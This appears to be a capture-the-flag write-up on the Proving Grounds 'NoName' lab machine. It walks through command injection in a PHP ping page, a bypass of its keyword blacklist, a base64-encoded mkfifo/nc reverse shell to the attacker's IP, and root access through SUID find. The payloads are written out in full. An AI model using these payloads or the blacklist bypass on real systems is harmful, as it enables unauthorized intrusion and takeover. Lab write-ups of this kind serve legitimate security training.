# PG Play - NoName

#### Ip: 192.168.183.15
#### Name: NoName
#### Difficulty: Intermediate
#### Community Rating: Intermediate

----------------------------------------------------------------------

### Enumeration

As always, lets kick things off by scanning all TCP ports with Nmap. Here I'll also use the `-sC` and `-sV` flags to use basic Nmap scripts and to enumerate versions too.

```text
┌──(ryan㉿kali)-[~/PG/Play/NoName]
└─$ sudo nmap -p- --min-rate 10000 -sC -sV   192.168.183.15
[sudo] password for ryan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-30 10:20 CDT
Nmap scan report for 192.168.183.15
Host is up (0.071s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.29 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.92 seconds
```

Looking at the site on port 80 we find a "fake admin area"

noname_site.png

Trying to insert a command we get the message `Fake ping executed`

Opening WireShark and listening for packets, we can see the site is indeed able to ping out tun0 address:

noname_ping.png

Lets capture this request in Burp and see if we can execute any other commands then `ping`

After quite awhile trying different command injection techniques, I was unable to to get any execution.

Taking a step back and trying some directory  fuzzing I find both an `/admin` page as well as a `/superadmin.php` page. 

`/admin` seemed to just be an image gallery. The page source however had an interesting comment: `<!--passphrase:harder-->`. We'll hold onto that and see if we can use it anywhere later.

### Exploitation

Navigating to `superadmin.php` we find a similar functionality as the "fake admin area", but this time we can see the ping being executing in our browser output:

noname_admin_ping.png

I can now perform command injection in this field, confirming the fact with: `127.0.0.1 | id`

noname_ex.png

Still struggling to get a reverse shell, I decide to check out the superadmin.php file and see several different strings being blacklisted:

```php
<?php
   if (isset($_POST['submitt']))
{
   	$word=array(";","&&","/","bin","&"," &&","ls","nc","dir","pwd");
   	$pinged=$_POST['pinger'];
   	$newStr = str_replace($word, "", $pinged);
   	if(strcmp($pinged, $newStr) == 0)
		{
		    $flag=1;
		}
       else
		{
		   $flag=0;
		}
}

if ($flag==1){
$outer=shell_exec("ping -c 3 $pinged");
echo "<pre>$outer</pre>";
}
?>
```

This will make getting a reverse shell a bit more tricky because so many characters are blacklisted. 

Capturing the request in Burp, we can bypass the blacklist at least for now by inserting apostrophes between charcters:

noname_bypass.png

But we'll still need to get a reverse shell here. Lets base64 encode a reverse shell onliner to try to bypass the blacklist:

I'll use:

```text
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.208 443 >/tmp/f
```

Base64 encode it, and then use `echo -n (rev_shell) | base64 -d | bash` to pass the command in Burp:

```text
pinger=127.0.0.1+|echo+-n+"cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL2Jhc2ggLWkgMj4mMXxuYyAxOTIuMTY4LjQ1LjIwOCA0NDMgPi90bXAvZg=="+|+base64+-d+|bash&submitt=Submit+Query
```

Running this with a NC listener going gets me a shell back as www-data:

```text
┌──(ryan㉿kali)-[~/PG/Play/NoName]
└─$ nc -lnvp 443
listening on [any] 443 ...
connect to [192.168.45.208] from (UNKNOWN) [192.168.183.15] 50730
bash: cannot set terminal process group (739): Inappropriate ioctl for device
bash: no job control in this shell
www-data@haclabs:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@haclabs:/var/www/html$ whoami
whoami
www-data
www-data@haclabs:/var/www/html$ hostname
hostname
haclabs
```

I can now grab the local.txt flag:

noname_local.png

### Privilege Escalation

Loading linpeas onto the target we see that `find` has the SUID bit set.

noname_lin.png

Heading over to GTFObins.com we find the exact command we need to exploit this misconfiguration:

noname_gtfo.png

`./find . -exec /bin/sh -p \; -quit`

We can execute this command, elevate our shell to root, and grab the final flag:

noname_root.png

Thanks for following along!

-Ryan

--------------------------------------------------------------------